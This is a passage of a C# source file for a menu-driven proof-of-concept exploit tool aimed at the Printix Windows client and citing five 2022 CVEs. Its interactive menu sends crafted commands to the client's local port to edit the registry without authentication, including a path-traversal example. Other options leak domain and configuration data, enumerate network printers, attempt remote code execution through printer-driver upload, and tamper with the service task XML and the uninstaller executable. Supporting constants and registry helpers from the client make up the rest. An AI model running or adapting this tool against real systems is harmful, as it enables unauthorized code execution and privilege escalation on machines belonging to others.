            Console.WriteLine("You're currently in CVESUBMISSION.cs...");
        FORCERESTART:

            try
            {

                //Edit any registry without auth: 
                //Use command 49, use the code provided on the desktop...
                //This modifies it directly, so no specific username is needed. :D

                //The command parameter, a list of commands is below.
                int command = 43;

                //To force the user to input variables or not.
                bool forceCustomInput = false;

                //The data to send, this isn't flexible and should be used only for specific examples.
                //Try to keep above 4 characters if you're just shoving things into the command.
                string data = "{\"profileID\":1,\"result\":true}";

                //The username to use.
                //This is to fulfill the requriements whilst in development mode.
                DefaultValues.CurrentSessName = "printixMDNs7914";

                //The host to connect to. DEFAULT= "localhost"
                string host = "localhost";

            //								Configuration Above

            //printix\SOFTWARE\printix.net\Printix Client\..././HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\pwn

            //The above code works to make a registry inside Printix Client, try to figure out a way to traverse backwards though!


            InvalidInputLabel:
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("-- Written By Logan Latvala--  \n--Proof of concept for the following CVEs: \n1. CVE-2022-30006 \n2. CVE-2022-29554 \n3. CVE-2022-29553 \n4. CVE-2022-29552 \n5. CVE-2022-29551 \n \n");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Please select the certificate you want to use with port 21338.");
                //Deprecated, certificates are no longer needed to verify, as clientside only uses the self-signed certificates now.
                Console.WriteLine("Already selected, client authentication isn't needed.");

                Console.WriteLine(" /───────────────────────────\\ ");
                Console.WriteLine("\nWhat would you like to do?");
                Console.WriteLine("\n     1. Send Ping Request");
                Console.WriteLine("     2. Send Registry Edit Request | CVE-2022-29552");
                Console.WriteLine("     3. Send Custom Request  (Do not use)");
                Console.WriteLine("     4. Retrieve domains & config info (Sensitive)  ");
                Console.WriteLine("     5. Retrieve all printers on a network  (Very Sensitive) ");
                //124 - get printers on network
                Console.WriteLine("     6. Send printer driver upload request (RCE | Very Experimental)");
                Console.WriteLine("     7. Send & Modify PrintixServiceTask.xml (Requires Service Restart)");
                Console.WriteLine("     8. Send & Modfy unis000.exe");
                Console.WriteLine("     9. Change Printix ProgramDir");
                Console.WriteLine("     0. Exit");
                //USE COMMAND 120 FOR IMPORTANT INFORMATION DISCLOSURE
                Console.Write("I choose option # ");

                try
                {
                    switch (int.Parse(Console.ReadLine().ToLower()))
                    {
                        case (0):
                            Environment.Exit(0);
                            break;
                        case (1):
                            Session session = new Session(118);

                            command = session.commandNumber;

                            host = session.host;
                            data = session.data;

                            string fullname = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname.Substring(fullname.Length / 2);
                            string Response = startClientSession(host, (UItasks)command, data);

                            if (Response != null && !Response.Contains("[err]"))
                            {
                                Console.WriteLine("\n Ping back received, try the link below to obtain Domain Info from a Login Page. (Azure AD, Google, Microsoft, Ect.)");
                                Console.WriteLine("\n https://auth.printix.net/oauth/authorize/tenant/" + Response);
                                Console.WriteLine("I recommend running command #4 for domain enumeration.");
                            }
                            else
                            {
                                Console.WriteLine("\n The Pingback didn't send any results, increase the retry amount incase the host is active and listening.");
                            }
                            //https://auth.printix.net/oauth/authorize/tenant/THISISATENANTID?response_type=code&client_id=PrintixClient&client_secret=1234&state=Unit+Admin&redirect_uri=http://localhost:21339/oauth/authorize&prompt=login

                            break;
                        case (2):
                            Session sessionTwo = new Session(165);

                            command = 165;
                            host = sessionTwo.host;
                            data = sessionTwo.data;


                            string fullname2 = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname2.Substring(fullname2.Length / 2);
                            string Response2 = startClientSession(host, (UItasks)command, data, false);
                            if (Response2 != null && !Response2.Contains("[err]"))
                            {
                                Console.WriteLine("\n The data has been sent yet this function does not give a response.");
                            }

                            break;
                        case (3):

                            Console.WriteLine("What command number do you want to input?");
                            command = int.Parse(Console.ReadLine().ToString());
                            Console.WriteLine("What IP would you like to use? (Default = localhost)");
                            host = Console.ReadLine();
                            Console.WriteLine("What data do you want to send? (Keep over 4 chars if you are not sure!)");
                            data = Console.ReadLine();

                            // Console.WriteLine("What session name do you want to use? ");

                            string fullname3 = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname3.Substring(fullname3.Length / 2);
                            string Response3 = startClientSession(host, (UItasks)command, data);
                            if (Response3 != null && !Response3.Contains("[err]"))
                            {
                                Console.WriteLine(Response3);
                            }
                            else
                            {
                                Console.WriteLine("No response has been returned.");
                            }
                            break;
                        case (4):
                            Session sessionFour = new Session(120);

                            command = 120;
                            host = sessionFour.host;
                            data = sessionFour.data;


                            string fullname4 = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname4.Substring(fullname4.Length / 2);
                            string Response4 = startClientSession(host, (UItasks)command, data, true);
                            if (Response4 != null && !Response4.Contains("[err]"))
                            {
                                Console.WriteLine("\n To prevent crowding, the response is stored above.");
                            }
                            break;
                        case (5):
                            Session sessionFive = new Session(124);

                            command = 124;
                            host = sessionFive.host;
                            data = sessionFive.data;


                            string fullname5 = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname5.Substring(fullname5.Length / 2);
                            string Response5 = startClientSession(host, (UItasks)command, data, true);
                            if (Response5 != null && !Response5.Contains("[err]"))
                            {
                                Console.WriteLine("\n --To prevent crowding, the response is stored above.--");
                            }
                            break;
                        case (6):
                            Session sessionSix = new Session(151);
                            command = 151;


                            host = sessionSix.host;
                            data = sessionSix.data;


                            string fullname6 = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname6.Substring(fullname6.Length / 2);
                            string Response6 = startClientSession(host, (UItasks)command, data, true);
                            if (Response6 != null && !Response6.Contains("[err]"))
                            {
                                Console.WriteLine("\n --To prevent crowding, the response is stored above.--");
                            }
                            //Printer Driver Session

                            break;
                        case (7):
                            Session sessionSeven = new Session(1671);

                            command = 165;
                            host = sessionSeven.host;
                            data = sessionSeven.data;


                            string fullname7 = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname7.Substring(fullname7.Length / 2);
                            string Response7 = startClientSession(host, (UItasks)command, data, false);
                            if (Response7 != null && !Response7.Contains("[err]"))
                            {
                                Console.WriteLine("\n The data has been sent yet this function does not give a response.");
                            }

                            break;
                        case (8):
                            Session sessionEight = new Session(1672);

                            command = 165;
                            host = sessionEight.host;
                            data = sessionEight.data;


                            string fullname8 = Guid.NewGuid().ToString();
                            DefaultValues.CurrentSessName = "printixReflectorPackage" + fullname8.Substring(fullname8.Length / 2);
                            string Response8 = startClientSession(host, (UItasks)command, data, false);
                            if (Response8 != null && !Response8.Contains("[err]"))
                            {

                                Console.WriteLine("\n The data has been sent yet this function does not give a response.");
                            }

                            Console.WriteLine("[This is highly experimental, an explanation on the next steps will be given below..]");
                            Console.WriteLine("1. Ensure that the Printix Installation has a KioskMode value in the registry.\n2. Ensure that the command " +
                                "you just ran changed it to point at a new unis000.exe\n" +
                                "3. Visit this link on the remote computer, replacing KIOSMODEVALUE with the value of the KioskMode.");
                            Console.WriteLine("http://localhost:21339/oauth/e/?error=INVALID_CREDENTIALS&errorMessage=KIOSKMODEVALUE");
                            Console.WriteLine("Confused? Please visit the github for additional information on the requirements of this exploit.");

                            break;
                    }
                }

                catch (Exception e)
                {
                    Console.WriteLine("Invalid Input!");
                    goto InvalidInputLabel;
                }




                Console.ReadLine();

            }

            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.ReadLine();

                //Environment.Exit(e.HResult);
            }

            goto FORCERESTART;
        }

    }
    public class CompCommHeader
    {
        public enum CompCommCommand
        {
            UserName = 1,
            UserSession,
            UserSettings,
            UserSID,
            KeepAlive,
            UserData
        }

        public static string subject = "PrintixClient";

        public static string RedirSubject = "PrintixRedirector";
    }
    public static class DefaultValues
    {
        [JsonConverter(typeof(StringEnumConverter))]
        public enum ErrorCodes
        {
            OK,
            OBJECTS_CHANGED,
            JOB_NOT_FOUND,
            PRINTER_NOT_FOUND,
            DEVICE_NOT_FOUND,
            SERVER_NOT_FOUND,
            UNKNOWN_PARAMETERS,
            INVALID_PARAMETERS,
            UNKNOWN_TASK,
            INVALID_STATE,
            INVALID_USER_CREDENTIALS,
            INVALID_CLIENT_TYPE,
            EXCEPTION,
            CONNECTION_FAILED,
            ALREADY_EXISTS,
            UPLOADED_CLOUD
        }

        public enum VDITypes
        {
            VDI_DISABLED,
            VDI_ENABLED,
            VDI_ENABLED_UPGRADE
        }

        public const string method = "https";

        public const bool useHttps = false;

        public const string UImethod = "http";

        public const int printPort = 9100;

        public const int lprPort = 515;

        public const int snmpPort = 161;

        public const string RunToken = "PixWindowsUI";

        public const string WSToken = "WSId";

        public const string WSGroups = "WSGroups";

        public const string DNSMsi = "mDNSMsi";

        public const string StartAsVDI = "StartAsVDI";

        public const string userNameFormat = "UserNameFormat";

        public const string AuthCbURL = "http://localhost:21339/oauth/authorize";

        public const string AppURL = "http://app.printix.net";

        public const string CaptionInfoURL = "https://assets.printix.net/captions/Caption_Client_ALL.json";

        public const string GhostScriptURL = "https://assets.printix.net/3rdpartysoftware/GhostScript/WindowsVersion.json";

        public const string SumatraPDFURL = "https://assets.printix.net/3rdpartysoftware/SumatraPDF/WindowsVersion.json";

        public const string mDNSURL = "https://assets.printix.net/3rdpartysoftware/mDNS/WindowsVersion.json";

        public const string CodeName = "PrintixClientWindows.zip";

        public const string VersionName = "WindowsClientVersion.json";

        public const string RedirCodeName = "PrintixRedirector.zip";

        public const string RedirVersionName = "PrintixRedirectorVersion.json";

        public const string ConfigCodeName = "PrintixConfigurator.exe";

        public const string TransferURL = "https://{0}:{1}/file/{2}";

        public const string gsDir = "gs";

        public const string pdfDir = "sPdf";

        public const string mDNSDir = "mDNS";

        public const string ServiceName = "PrintixService";

        public const string ClientName = "PrintixClient";

        public const string RedirectorName = "PrintixRedirector";

        public const string ServiceExe = "PrintixService.exe";

        public const string ClientExe = "PrintixClient.exe";

        public const string RedirectorExe = "PrintixRedirector.exe";

        public const string UnInsPortsExe = "uninsports.exe";

        public const string UnInstallExe = "unins000.exe";

        public const string PrintixPackage = "PrintixPackage.txt";

        public const string ServiceSchTask = "PrintixServiceTask.xml";

        public const string ConfigFile = "Config.json";

        public const string CaptionInfoFile = "CaptionInfo.json";

        public const string CaptionTypesFile = "CaptionTypes.json";

        public const string PrinterFile = "Printers.json";

        public const string AdsFile = "Ads.json";

        public const string nwFile = "Networks.json";

        public const string LogDir = "Logs";

        public const string JobDir = "Jobs";

        public const string ConfDir = "Configuration";

        public static int authPort = 443;

        public static int ServerPort = 443;

        public static int WSManagerRetry = 259200000;

        public static int UpgradeManagerRetry = 3600000;

        public static string TenantID = null;

        public static string TenantName = null;

        public static string CurrentSessName = null;

        public static VDITypes VDIType = VDITypes.VDI_DISABLED;

        public static bool runningAsVDI = false;

        public static string RegPath = "SOFTWARE\\printix.net\\Printix Client\\";

        public static string RegUserPath = "SOFTWARE\\printix.net\\Printix Client\\Users\\";

        public static string RegPathRT = "SOFTWARE\\printix.net\\Printix Client\\RT";

        public static string RegUserRTPath = "SOFTWARE\\printix.net\\Printix Client\\Users\\{0}\\RT";

        public static string RegUserSettPath = "SOFTWARE\\printix.net\\Printix Client\\Users\\{0}\\Settings";

        public static string RegUserMess = "SOFTWARE\\printix.net\\Printix Client\\Users\\{0}";

        public static string RegUILaunch = "SOFTWARE\\printix.net\\Printix Client\\Users\\LaunchUI\\";

        public static string RunPath = "SOFTWARE\\microsoft\\windows\\currentversion\\run";

        public static string BrowserPath = "SOFTWARE\\microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION";

        public static string RedirRegPath = "SOFTWARE\\printix.net\\Printix Redirector\\";

        public static string ConfigRegPath = "SOFTWARE\\printix.net\\Printix Configurator\\";

        public static int JobforwardPort = 21335;

        public static int RedirectorPort = 21336;

        public static int pipePort = 21338;

        public static int IppPrintPort = 21339;

        public static int CallBackPort = 21339;

        public static int PDPBroadcastPort = 21337;

        public static string AuthServer = "auth.printix.net";

        public static string AuthURL = "https://auth.printix.net:{0}/oauth/authorize/tenant/{1}";

        public static string AuthHubURL = "https://sign-in.printix.net:{0}/tenanthub";

        public static string AuthKioskURL = "https://auth.printix.net:{0}/oauth/authorize/tenant/{1}/kiosk";

        public static string TokenURL = "https://auth.printix.net:{0}/oauth/token";

        public static string ClientAuthURL = "https://auth.printix.net:{0}/oauth/client";

        public static string AuthOnBehalf = "https://auth.printix.net/oauth/{0}/onBehalfOf/token";

        public static string AuthMS = "https://auth.printix.net/identity-providers/azure-login/signin?tenant_id={0}";

        public static string AuthSucces = "https://sign-in.printix.net/response/{0}/success";

        public static string UpgradeURL = "https://printix.s3-eu-west-1.amazonaws.com/tenants/{0}/clients/{1}";

        public static string ApiServer = "api.printix.net";

        public static string ServerURL = "https://api.printix.net:{0}/v1/tenants/{1}";

        public static string ConfigURL = "";

        public static string PrinterURL = "";

        public static string QueuesURL = "";

        public static string PrinterDrvUploadURL = "/printerdriver";

        public static string SoftwareDownloadURL = "";

        public static string UserURL = "";

        public static string JobURL = "";

        public static string WSURL = "";

        public static string NetworkURL = "";

        public static string PrinterDrvQueryURL = "/internal/printerinfo/advertiseDrivers";

        public static string TaskURL = "/internal/tasks?workstation={0}";

        public static string TaskTestURL = "/internal/tasks/{0}/acquireExclusiveAccess";

        public static string TaskDoneURL = "/internal/tasks/{0}/completed";

        public static string TaskProgressURL = "/internal/tasks/{0}/progress";

        public static string TaskErrorURL = "/internal/tasks/{0}/failed";

        public static string ProxyDoneURL = "/internal/proxy/payload/{0}/delivered";

        public static string ProxyErrorURL = "/internal/proxy/payload/{0}/failed";

        public static string AuditURL = "";

        public static string ErrorURL = "/internal/error/reportErrorResponse";

        public static string IPPAttribUrl = "";

        public static string RootPath { get; set; }

        public static string LogPath { get; set; }

        public static string JobPath { get; set; }

        public static string ConfPath { get; set; }

        public static void getAndSetDefaultURLs()
        {
            string environmentVariable = Environment.GetEnvironmentVariable("XXX_PRINTIX_API");
            string environmentVariable2 = Environment.GetEnvironmentVariable("XXX_PRINTIX_AUTH");
            if (string.IsNullOrEmpty(environmentVariable))
            {
                environmentVariable = ApiServer;
            }
            else
            {
                ApiServer = environmentVariable;
            }
            if (string.IsNullOrEmpty(environmentVariable2))
            {
                environmentVariable2 = AuthServer;
            }
            else
            {
                AuthServer = environmentVariable2;
            }
            string text = doGetCVRegistry("Environment");
            if (!string.IsNullOrEmpty(text))
            {
                if (text.Equals("devenv"))
                {
                    ApiServer = "api.devenv.printix.net";
                    AuthServer = "auth.devenv.printix.net";
                }
                if (text.Equals("testenv"))
                {
                    ApiServer = "api.testenv.printix.net";
                    AuthServer = "auth.testenv.printix.net";
                }
                if (text.Equals("testenv2"))
                {
                    ApiServer = "api2.testenv.printix.net";
                    AuthServer = "auth2.testenv.printix.net";
                }
            }
            buildURLs(ApiServer, AuthServer);
        }

        public static void buildAuthURLs(string auth)
        {
            if (auth.Contains(".devenv."))
            {
                AuthHubURL = "https://sign-in.devenv.printix.net:{0}/tenanthub";
                AuthSucces = "https://sign-in.devenv.printix.net/response/{0}/success";
                AuthKioskURL = "https://auth.devenv.printix.net:{0}/oauth/authorize/tenant/{1}/kiosk";
            }
            else if (auth.Contains(".testenv."))
            {
                AuthHubURL = "https://sign-in.testenv.printix.net:{0}/tenanthub";
                AuthSucces = "https://sign-in.testenv.printix.net/response/{0}/success";
                AuthKioskURL = "https://auth.testenv.printix.net:{0}/oauth/authorize/tenant/{1}/kiosk";
            }
            else
            {
                AuthHubURL = "https://sign-in.printix.net:{0}/tenanthub";
                AuthSucces = "https://sign-in.printix.net/response/{0}/success";
                AuthKioskURL = "https://auth.printix.net:{0}/oauth/authorize/tenant/{1}/kiosk";
            }
        }

        public static void buildURLs(string api, string auth)
        {
            Console.WriteLine("Running with API: {0}, AUTH: {1}", api, auth);
            ServerURL = "https://" + api + ":{0}/v1/tenants/{1}";
            AuthURL = "https://" + auth + ":{0}/oauth/authorize/tenant/{1}";
            buildAuthURLs(auth);
            TokenURL = "https://" + auth + ":{0}/oauth/token";
            ClientAuthURL = "https://" + auth + ":{0}/oauth/client";
            AuthOnBehalf = "https://" + auth + "/oauth/{0}/onBehalfOf/token";
            AuthMS = "https://" + auth + "/identity-providers/azure-login/signin?tenant_id={0}";
            IPPAttribUrl = "https://" + api;
        }

        public static void SetRootPath(string _RootPath)
        {
            RootPath = _RootPath;
            LogPath = Path.Combine(RootPath, "Logs");
            ConfPath = Path.Combine(RootPath, "Configuration");
            JobPath = Path.Combine(RootPath, "Jobs");
            if (!Directory.Exists(RootPath))
            {
                Directory.CreateDirectory(RootPath);
            }
            if (!Directory.Exists(LogPath))
            {
                Directory.CreateDirectory(LogPath);
            }
            if (!Directory.Exists(ConfPath))
            {
                Directory.CreateDirectory(ConfPath);
            }
            if (!Directory.Exists(JobPath))
            {
                Directory.CreateDirectory(JobPath);
            }
        }

        public static string doGetCVRegistry(string keyName)
        {
            RegistryKey registryKey = null;
            string text = string.Empty;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(RegPath + "CurrentVersion", writable: false);
                if (registryKey == null)
                {
                    Console.WriteLine("CurrentVersion: Not able to open directory");
                }
                else
                {
                    text = (string)registryKey.GetValue(keyName, "");
                }
                Console.WriteLine("Registry: {0} = {1}", keyName, text);
                return text;
            }
            finally
            {
                registryKey?.Close();
            }
        }

        public static string doSetCVRegistry(string keyName, string value)
        {
            RegistryKey registryKey = null;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(RegPath + "CurrentVersion", writable: true);
                if (registryKey == null)
                {
                    Console.WriteLine("CurrentVersion: Not able to open directory");
                }
                else
                {
                    registryKey.SetValue(keyName, value, RegistryValueKind.String);
                }
                Console.WriteLine("Registry: {0} = {1}", keyName, value);
                return value;
            }
            finally
            {
                registryKey?.Close();
            }
        }

        public static void setBrowserVersioninRegistry()
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BrowserPath, writable: true);
            if (registryKey == null)
            {
                Console.WriteLine("setBrowserVersioninRegistry: Not able to open registry");
                return;
            }
            registryKey.SetValue("PrintixClient.exe", 10000, RegistryValueKind.DWord);
            Console.WriteLine("setBrowserVersioninRegistry: Browser version: 10000");
            registryKey.Close();
        }

        public static string getRootDataDir(string regPath)
        {
            RegistryKey registryKey = null;
            string text = Path.Combine(Environment.ExpandEnvironmentVariables("%ProgramData%"), "Printix.net\\Printix Client");
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(regPath + "CurrentVersion", writable: true);
                if (registryKey == null)
                {
                    registryKey = Registry.LocalMachine.CreateSubKey(regPath + "CurrentVersion");
                }
                if (registryKey != null)
                {
                    string text2 = (string)registryKey.GetValue("DataDir");
                    if (string.IsNullOrEmpty(text2))
                    {
                        registryKey.SetValue("DataDir", text);
                        return text;
                    }
                    text = text2;
                    return text;
                }
                return text;
            }
            catch (SecurityException ex)
            {
                Console.WriteLine("SecurityException in getRootDir. ex: {0}", ex.Message);
                return text;
            }
            finally
            {
                registryKey?.Close();
            }
        }

        public static string getRootProgramDir(string regPath)
        {
            RegistryKey registryKey = null;
            string text = (text = Path.Combine(Environment.ExpandEnvironmentVariables("%ProgramFiles%"), "Printix.net\\Printix Client"));
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(regPath + "CurrentVersion", writable: true);
                if (registryKey == null)
                {
                    registryKey = Registry.LocalMachine.CreateSubKey(regPath + "CurrentVersion");
                }
                if (registryKey != null)
                {
                    string text2 = (string)registryKey.GetValue("ProgramDir");
                    if (string.IsNullOrEmpty(text2))
                    {
                        registryKey.SetValue("ProgramDir", text);
                        return text;
                    }
                    text = text2;
                    return text;
                }
                return text;
            }
            catch (SecurityException ex)
            {
                Console.WriteLine("SecurityException in getRootDir. ex: {0}", ex.Message);
                return text;
            }
            finally
            {
                registryKey?.Close();
            }
        }

        public static string getResourceID(string URL)
        {
            if (string.IsNullOrEmpty(URL))
            {
                return string.Empty;
            }
            if (URL.Contains('/'))
            {
                char[] separator = new char[1] { '/' };
                string[] array = URL.Split(separator);
                if (array.Length > 1)
                {
                    return array[array.Length - 1];
                }
            }
            return URL;
        }

        public static bool doGetKioskMode(bool doShow = false)
        {
            string value = doGetKioskModeValue(doShow);
            if (string.IsNullOrEmpty(value))
            {
                return false;
            }
            return true;
        }

        public static string doGetKioskModeValue(bool doShow = false)
        {
            RegistryKey registryKey = null;
            string text = null;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (registryKey == null)
                {
                    Console.WriteLine("KioskMode: Not able to open directory");
                }
                else
                {
                    text = (string)registryKey.GetValue("KioskMode", null);
                }
                if (doShow)
                {
                    Console.WriteLine("KioskMode Registry: {0}", text);
                    return text;
                }
                return text;
            }
            finally
            {
                registryKey?.Close();
            }
        }

        public static bool doGetUseQueuePermission()
        {
            RegistryKey registryKey = null;
            int num = 0;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (registryKey == null)
                {
                    Console.WriteLine("useGroupPermissions: Not able to open directory");
                }
                else
                {
                    num = (int)registryKey.GetValue("useGroupPermissions", 0);
                }
                Console.WriteLine("useGroupPermissions Registry: {0}", num);
            }
            finally
            {
                registryKey?.Close();
            }
            if (num != 1)
            {
                return false;
            }
            return true;
        }

        public static VDITypes startAsVDI()
        {
            RegistryKey registryKey = null;
            VDITypes vDITypes = VDITypes.VDI_DISABLED;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (registryKey != null)
                {

                }
                else
                {
                    Console.WriteLine("StartAsVDI: Not able to open directory");
                }
                Console.WriteLine("StartAsVDI: Value: {0}", vDITypes.ToString());
                return vDITypes;
            }
            catch (Exception ex)
            {
                Console.WriteLine("StartAsVDI: ex: {0}", ex.Message);
                return VDITypes.VDI_DISABLED;
            }
            finally
            {
                registryKey?.Close();
            }
        }

        public static bool doGetForceAzure()
        {
            RegistryKey registryKey = null;
            int num = 0;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (registryKey == null)
                {
                    Console.WriteLine("forceAzurePrt: Not able to open directory");
                }
                else
                {
                    num = (int)registryKey.GetValue("forceAzurePrt", 0);
                }
                Console.WriteLine("forceAzurePrt Registry: {0}", num);
            }
            finally
            {
                registryKey?.Close();
            }
            if (num <= 0)
            {
                return false;
            }
            return true;
        }
    }


    // NetworkUtils.Win32Utils


    public class Win32Utils
    {
        private struct OSVERSIONINFOEX
        {
            public int dwOSVersionInfoSize;

            public int dwMajorVersion;

            public int dwMinorVersion;

            public int dwBuildNumber;

            public int dwPlatformId;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;

            public short wServicePackMajor;

            public short wServicePackMinor;

            public short wSuiteMask;

            public byte wProductType;

            public byte wReserved;
        }

        private static string osVersion = null;

        private static Version netVersion = null;

        private static string clientVersion = string.Empty;

        private static bool isWVD = false;

        private static List<string> ServerVersions = new List<string> { "NT3.51", "NT4.0", "2000", "2008", "2012", "2016" };

        public static bool Is64BitProcess => IntPtr.Size == 8;

        public static bool Is64BitOperatingSystem
        {
            get
            {
                if (Is64BitProcess)
                {
                    return true;
                }
                if (ModuleContainsFunction("kernel32.dll", "IsWow64Process") && IsWow64Process(GetCurrentProcess(), out var isWow))
                {
                    return isWow;
                }
                return false;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Wow64EnableWow64FsRedirection(ref IntPtr ptr);

        public static bool IsUserAdministrator()
        {
            try
            {
                WindowsIdentity current = WindowsIdentity.GetCurrent();
                Console.WriteLine("User: {0}", current.Name);
                WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
                bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
                Console.WriteLine("User: {0} {1}", flag, current.AuthenticationType);
                return flag;
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine("Ex User", ex);
                return false;
            }
            catch (Exception ex2)
            {
                Console.WriteLine("Ex", ex2);
                return false;
            }
        }

        [DllImport("kernel32.dll")]
        private static extern bool GetVersionEx(ref OSVERSIONINFOEX osVersionInfo);

        private static bool isClient()
        {
            RegistryKey registryKey = null;
            string text = string.Empty;
            bool flag = false;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false);
                if (registryKey == null)
                {
                    Console.WriteLine("Win32Utils: Not able to open SOFTWARE/Microsoft/Windows NT/CurrentVersion");
                }
                else
                {
                    text = (string)registryKey.GetValue("InstallationType", "");
                }
                return text == "Client";
            }
            finally
            {
                registryKey?.Close();
            }
        }

        public static string GetOSVersion()
        {
            if (!string.IsNullOrEmpty(osVersion))
            {
                return osVersion;
            }
            string text = "Unknown";
            OSVERSIONINFOEX osVersionInfo = default(OSVERSIONINFOEX);
            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
            switch (Environment.OSVersion.Platform)
            {
                case PlatformID.Win32S:
                    text = "3.1";
                    break;
                case PlatformID.Win32Windows:
                    switch (Environment.OSVersion.Version.Minor)
                    {
                        case 0:
                            text = "95";
                            break;
                        case 10:
                            text = (Environment.OSVersion.Version.Revision.ToString().Equals("2222A") ? "98SE" : "98");
                            break;
                        case 90:
                            text = "ME";
                            break;
                    }
                    break;
                case PlatformID.Win32NT:
                    {
                        GetVersionEx(ref osVersionInfo);
                        byte wProductType = osVersionInfo.wProductType;
                        Console.WriteLine("GetOSVersion: Platform: {0}, major/minor: {1}, {2}, type: {3}", Environment.OSVersion.Platform, Environment.OSVersion.Version.Major, Environment.OSVersion.Version.Minor, wProductType);
                        switch (Environment.OSVersion.Version.Major)
                        {
                            case 3:
                                text = "NT3.51";
                                break;
                            case 4:
                                text = "NT4.0";
                                break;
                            case 5:
                                switch (Environment.OSVersion.Version.Minor)
                                {
                                    case 0:
                                        text = "2000";
                                        break;
                                    case 1:
                                        text = "XP";
                                        break;
                                    case 2:
                                        text = "XP";
                                        break;
                                }
                                break;
                            case 6:
                                switch (Environment.OSVersion.Version.Minor)
                                {
                                    case 0:
                                        switch (wProductType)
                                        {
                                            case 1:
                                                text = "WIN_VISTA";
                                                break;
                                            case 2:
                                            case 3:
                                                text = "WIN_2008";
                                                break;
                                        }
                                        break;
                                    case 1:
                                        switch (wProductType)
                                        {
                                            case 1:
                                                text = "WIN_7";
                                                break;
                                            case 2:
                                            case 3:
                                                text = "WIN_2008R2";
                                                break;
                                        }
                                        break;
                                    case 2:
                                        switch (wProductType)
                                        {
                                            case 1:
                                                text = "WIN_8";
                                                break;
                                            case 2:
                                            case 3:
                                                text = "WIN_2012";
                                                break;
                                        }
                                        break;
                                    case 3:
                                        switch (wProductType)
                                        {
                                            case 1:
                                                text = "WIN_8_1";
                                                break;
                                            case 2:
                                            case 3:
                                                text = "WIN_2012R2";
                                                break;
                                        }
                                        break;
                                }
                                break;
                            case 10:
                                if (Environment.OSVersion.Version.Minor != 0)
                                {
                                    break;
                                }
                                switch (wProductType)
                                {
                                    case 1:
                                        text = "WIN_10";
                                        break;
                                    case 2:
                                    case 3:
                                        if (isClient())
                                        {
                                            text = "WIN_10";
                                            isWVD = true;
                                        }
                                        else
                                        {
                                            text = "WIN_2016";
                                        }
                                        break;
                                }
                                break;
                            case 12:
                                text = "WIN_10";
                                break;
                        }
                        break;
                    }
                case PlatformID.WinCE:
                    text = "CE";
                    break;
                case PlatformID.Unix:
                    {
                        string text2 = (Environment.OSVersion.Version.Major - 4).ToString();
                        Console.WriteLine("10." + (Environment.OSVersion.Version.Major - 4) + "." + Environment.OSVersion.Version.Minor);
                        text = "MAC_10_" + text2;
                        Console.WriteLine(text);
                        break;
                    }
            }
            return osVersion = ((!Is64BitProcess) ? (text + "_32") : (text + "_64"));
        }

        public static bool isRunningWVD()
        {
            return isWVD;
        }

        public static bool IsServer()
        {
            string operatingSystem = GetOSVersion();
            return ServerVersions.Any((string s) => operatingSystem.Contains(s));
        }

        public static bool IsServerOrWVD()
        {
            if (!IsServer())
            {
                return isRunningWVD();
            }
            return true;
        }

        public static string getSysUpTime()
        {
            try
            {
                PerformanceCounter performanceCounter = new PerformanceCounter("System", "System Up Time");
                performanceCounter.NextValue();
                TimeSpan timeSpan = TimeSpan.FromSeconds(performanceCounter.NextValue());
                return timeSpan.Days + " days " + timeSpan.Hours + ":" + timeSpan.Minutes + ":" + timeSpan.Seconds;
            }
            catch (Exception ex)
            {
                Console.WriteLine("getSysuptime: ex {0}", ex.Message);
                return "0 days 0:0:0";
            }
        }

        public static string getClientVersion()
        {
            if (string.IsNullOrEmpty(clientVersion))
            {
                //overwritten to work
                clientVersion = "10.10.30";
            }
            return clientVersion;
        }

        private static Version getvers(string version)
        {
            Version.TryParse(version, out netVersion);
            return netVersion;
        }

        public static Version GetDotNetVersion()
        {
            if (netVersion != null)
            {
                return netVersion;
            }
            string text = null;
            RegistryKey registryKey = null;
            try
            {
                registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full", writable: false);
                if (registryKey != null)
                {
                    text = (string)registryKey.GetValue("Version");
                    if (text != null)
                    {
                        return getvers(text);
                    }
                    registryKey.Close();
                    registryKey = null;
                }
                registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5", writable: false);
                if (registryKey != null)
                {
